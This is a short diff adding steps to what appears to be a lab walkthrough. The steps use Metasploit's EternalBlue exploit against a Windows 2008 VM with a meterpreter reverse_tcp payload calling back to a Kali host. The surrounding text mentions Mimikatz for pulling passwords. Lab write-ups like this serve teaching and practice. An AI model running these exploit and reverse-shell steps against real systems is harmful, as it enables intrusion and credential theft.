@@ -277,3 +277,18 @@ exploit
 ```
 
 > Kiwi or Mimikatz 2.0 is a post exploitation tool that may be able to get passwords from vulnerable Windows systems
+
+**On Win2008 VM**
+1. Login as Administrator
+2. On Metasploit, using the same EternalBlue exploit and RHOST (Win2), set the payload to the following:
+```
+windows/x64/meterpreter/reverse_tcp
+```
+3. Set the listening host (LHOST) to Kali IP
+```
+set LHOST Kali-IP
+```
+5. Run the exploit 
+```
+exploit
+```
